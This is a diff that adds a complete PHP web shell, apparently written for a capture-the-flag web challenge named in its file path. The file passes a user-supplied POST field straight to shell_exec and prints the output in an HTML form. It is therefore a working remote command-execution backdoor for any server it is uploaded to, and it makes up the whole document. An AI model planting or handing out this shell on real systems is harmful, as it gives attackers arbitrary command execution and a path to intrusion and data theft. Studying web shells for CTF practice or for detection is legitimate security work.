@@ -1,0 +1,49 @@
+<?php
+// filepath: c:\xampp\htdocs\testing\Hack4Gov\Challenge\Web\TURTLE_SHELL\shell.php
+
+$output = '';
+if (isset($_POST['cmd'])) {
+    $output = shell_exec($_POST['cmd']);
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PHP Shell</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+        #output {
+            margin-top: 20px;
+            padding: 10px;
+            border: 1px solid #ddd;
+            background-color: #f9f9f9;
+            text-align: left;
+            white-space: pre-wrap;
+            font-family: monospace;
+        }
+        input[type="text"] {
+            width: 300px;
+            padding: 5px;
+        }
+        button {
+            padding: 5px 10px;
+        }
+    </style>
+</head>
+<body>
+    <h1>PHP Shell</h1>
+    <form method="POST">
+        <input type="text" name="cmd" placeholder="Enter command" required>
+        <button type="submit">Execute</button>
+    </form>
+    <div id="output">
+        <?php if (!empty($output)) echo "<pre>$output</pre>"; ?>
+    </div>
+</body>
+</html>
